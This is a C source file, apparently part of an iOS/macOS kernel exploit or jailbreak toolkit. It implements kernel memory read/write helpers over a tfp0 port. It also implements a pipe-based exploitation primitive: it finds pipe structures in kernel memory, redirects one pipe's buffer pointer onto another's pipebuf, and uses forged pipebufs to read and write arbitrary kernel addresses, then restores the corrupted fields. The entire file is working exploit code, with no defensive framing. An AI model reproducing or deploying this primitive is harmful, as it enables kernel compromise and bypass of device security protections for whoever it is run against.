#include "kern_rw.h"

size_t kwrite(uint64_t where, const void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        size_t chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_write(dev_info->kernel_state.tfp0, where + offset, (mach_vm_offset_t)p + offset, (int)chunk);
        if (rv) {
            printf("[-] error on kwrite(0x%016llx)\n", where);
            break;
        }
        offset += chunk;
    }
    return offset;
}

void wk32(uint64_t where, uint32_t what) {
    uint32_t _what = what;
    kwrite(where, &_what, sizeof(uint32_t));
}


void wk64(uint64_t where, uint64_t what) {
    uint64_t _what = what;
    kwrite(where, &_what, sizeof(uint64_t));
}

size_t kread(uint64_t where, void *p, size_t size) {
    int rv;
    size_t offset = 0;
    while (offset < size) {
        mach_vm_size_t sz, chunk = 2048;
        if (chunk > size - offset) {
            chunk = size - offset;
        }
        rv = mach_vm_read_overwrite(dev_info->kernel_state.tfp0, where + offset, chunk, (mach_vm_address_t)p + offset, &sz);
        if (rv || sz == 0) {
            printf("[-] error on kread(0x%016llx)\n", where);
            break;
        }
        offset += sz;
    }
    return offset;
}

uint32_t rk32(uint64_t where) {
    uint32_t out;
    kread(where, &out, sizeof(uint32_t));
    return out;
}

uint64_t rk64(uint64_t where) {
    uint64_t out;
    kread(where, &out, sizeof(uint64_t));
    return out;
}

static struct pipebuf pipedump(uint64_t addr) {
    struct pipebuf pb;
    physreadbuf(kvtophys(addr), &pb, sizeof(struct pipebuf));
    return pb;
}

ret_t exploit_pipe_init(struct pipe_exploit_state *state, uint64_t self_proc) {
    if (pipe(state->pipe1) != 0) {
        return RET_ERR;
    }
    if (pipe(state->pipe2) != 0) {
        close(state->pipe1[0]);
        close(state->pipe1[1]);
        return RET_ERR;
    }

    uint8_t pipebuf[sizeof(struct pipebuf)];
    memset(pipebuf, 0, sizeof(struct pipebuf));
    // force buffer to be allocated
    write(state->pipe1[1], pipebuf, sizeof(struct pipebuf));
    write(state->pipe2[1], pipebuf, sizeof(struct pipebuf));
    read(state->pipe1[0], pipebuf, sizeof(struct pipebuf));
    read(state->pipe2[0], pipebuf, sizeof(struct pipebuf));

    uint64_t p_fd = early_rk64(self_proc + dev_info->kstruct_offsets.proc_p_fd);
    uint64_t fd_ofiles = early_rk64(p_fd + dev_info->kstruct_offsets.fd_ofiles);
    
    // find pipebuffer pipe 1 read
    uint64_t fproc = early_rk64(fd_ofiles + state->pipe1[0] * sizeof(uint64_t));
    uint64_t f_fglob = early_rk64(fproc + dev_info->kstruct_offsets.fp_fglob); // the pipe
    state->pipe1_addr = early_rk64(f_fglob + dev_info->kstruct_offsets.fg_data); // pipe (pipebuf is 0x0)
    DEBUG("Pipe 1: %#llx", state->pipe1_addr);
    // we'll use this to fixup pipes
    state->pipe1_pb = pipedump(state->pipe1_addr);

    // find pipebuffer pipe 2 read
    uint64_t fproc2 = early_rk64(fd_ofiles + state->pipe2[0] * sizeof(uint64_t));
    uint64_t f_fglob2 = early_rk64(fproc2 + dev_info->kstruct_offsets.fp_fglob); // the pipe
    state->pipe2_addr = early_rk64(f_fglob2 + dev_info->kstruct_offsets.fg_data); // pipe (pipebuf is 0x0)
    DEBUG("Pipe 2: %#llx", state->pipe2_addr);
    // we'll use this to fixup pipes

    state->pipe2_pb = pipedump(state->pipe2_addr);
    // set pipe[1] pipebuf buffer to pipe[0]
    early_wk64(state->pipe1_addr + dev_info->kstruct_offsets.pb_buffer, state->pipe2_addr);
    // create fake pipebuf
    return RET_SUCCESS;
}

void cleanup_pipe_state(void) {
    struct pipe_exploit_state* state = &dev_info->pipe_state;
    if(dev_info->kernel_state.tfp0 != MACH_PORT_NULL) {
        if (state->pipe1_addr) {
            wk32(state->pipe1_addr + offsetof(struct pipebuf, in), state->pipe1_pb.in);
            wk32(state->pipe1_addr + offsetof(struct pipebuf, out), state->pipe1_pb.out);
            wk32(state->pipe1_addr + offsetof(struct pipebuf, cnt), state->pipe1_pb.cnt);
            wk32(state->pipe1_addr + offsetof(struct pipebuf, size), state->pipe1_pb.size);
            wk64(state->pipe1_addr + dev_info->kstruct_offsets.pb_buffer, state->pipe1_pb.buffer);
            state->pipe1_addr = 0;
        }

        if (state->pipe2_addr) {
            wk32(state->pipe2_addr + offsetof(struct pipebuf, in), state->pipe2_pb.in);
            wk32(state->pipe2_addr + offsetof(struct pipebuf, out), state->pipe2_pb.out);
            wk32(state->pipe2_addr + offsetof(struct pipebuf, cnt), state->pipe2_pb.cnt);
            wk32(state->pipe2_addr + offsetof(struct pipebuf, size), state->pipe2_pb.size);
            wk64(state->pipe2_addr + dev_info->kstruct_offsets.pb_buffer, state->pipe2_pb.buffer);
            state->pipe2_addr = 0;
        }
    } else {
        if (state->pipe1_addr) {
            early_wk32(state->pipe1_addr + offsetof(struct pipebuf, in), state->pipe1_pb.in);
            early_wk32(state->pipe1_addr + offsetof(struct pipebuf, out), state->pipe1_pb.out);
            early_wk32(state->pipe1_addr + offsetof(struct pipebuf, cnt), state->pipe1_pb.cnt);
            early_wk32(state->pipe1_addr + offsetof(struct pipebuf, size), state->pipe1_pb.size);
            early_wk64(state->pipe1_addr + dev_info->kstruct_offsets.pb_buffer, state->pipe1_pb.buffer);
            state->pipe1_addr = 0;
        }

        if (state->pipe2_addr) {
            early_wk32(state->pipe2_addr + offsetof(struct pipebuf, in), state->pipe2_pb.in);
            early_wk32(state->pipe2_addr + offsetof(struct pipebuf, out), state->pipe2_pb.out);
            early_wk32(state->pipe2_addr + offsetof(struct pipebuf, cnt), state->pipe2_pb.cnt);
            early_wk32(state->pipe2_addr + offsetof(struct pipebuf, size), state->pipe2_pb.size);
            early_wk64(state->pipe2_addr + dev_info->kstruct_offsets.pb_buffer, state->pipe2_pb.buffer);
            state->pipe2_addr = 0;
        }
    }
    
    if (state->pipe1[0] > 0) { close(state->pipe1[0]); state->pipe1[0] = 0; }
    if (state->pipe1[1] > 0) { close(state->pipe1[1]); state->pipe1[1] = 0; }
    if (state->pipe2[0] > 0) { close(state->pipe2[0]); state->pipe2[0] = 0; }
    if (state->pipe2[1] > 0) { close(state->pipe2[1]); state->pipe2[1] = 0; }
}

static uint64_t pipe_read_internal(uint64_t buffer_value, size_t read_size) {
    struct pipe_exploit_state* state = &dev_info->pipe_state;
    // create fake pipebuf
    struct pipebuf pb = {0};
    pb.cnt = read_size;
    pb.in = 0;
    pb.out = 0;
    pb.size = read_size;
    pb.buffer = buffer_value;
    // this writes over p2 pipebuf
    write(state->pipe1[1], &pb, sizeof(struct pipebuf));
    uint64_t reader = 0;
    // read from read end from p2
    read(state->pipe2[0], &reader, read_size);

    read(state->pipe1[0], &pb, sizeof(struct pipebuf));
    return reader;
}

uint64_t pipe_read_64(uint64_t buffer_value) {
    return pipe_read_internal(buffer_value, sizeof(uint64_t));
}

uint64_t pipe_read_32(uint64_t buffer_value) {
    return pipe_read_internal(buffer_value, sizeof(uint32_t));
}

static uint64_t pipe_write_internal(uint64_t buffer_value, uint64_t value, size_t write_size) {
    struct pipe_exploit_state* state = &dev_info->pipe_state;
    // create fake pipebuf
    struct pipebuf pb = {0};
    pb.cnt = 0;
    pb.in = 0;
    pb.out = 0;
    pb.size = state->pipe1_pb.size;
    pb.buffer = buffer_value;
    // this writes over p2 pipebuf
    write(state->pipe1[1], &pb, sizeof(struct pipebuf));
    // write to write end from p2
    write(state->pipe2[1], &value, write_size);
    read(state->pipe1[0], &pb, sizeof(struct pipebuf));
    return 0;
}

uint64_t pipe_write_64(uint64_t buffer_value, uint64_t value) {
    return pipe_write_internal(buffer_value, value, sizeof(uint64_t));
}

uint64_t pipe_write_32(uint64_t buffer_value, uint32_t value) {
    return pipe_write_internal(buffer_value, value, sizeof(uint32_t));
}
